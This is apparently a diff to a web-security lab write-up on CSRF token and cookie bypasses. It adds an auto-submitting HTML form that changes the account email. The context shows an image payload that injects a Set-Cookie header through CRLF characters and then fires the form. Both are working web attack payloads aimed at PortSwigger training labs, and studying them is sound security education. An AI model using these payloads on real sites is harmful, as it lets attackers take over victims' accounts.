@@ -27,6 +27,14 @@ To exploit this CSRF token+cookie mechanism, we need to perform 2 things.
 ```
 #### Exploit
 ```html
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="anything%40web-security-academy.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
+```html
 <img src="https://0a5000e9036c9fa3820d15c300a500d4.web-security-academy.net/?search=asdasfa%0d%0aSet-Cookie:%20csrf=testing;%20SameSite=None" onerror="document.forms[0].submit()">
 ```
 ### Testing Referer Header for CSRF attack
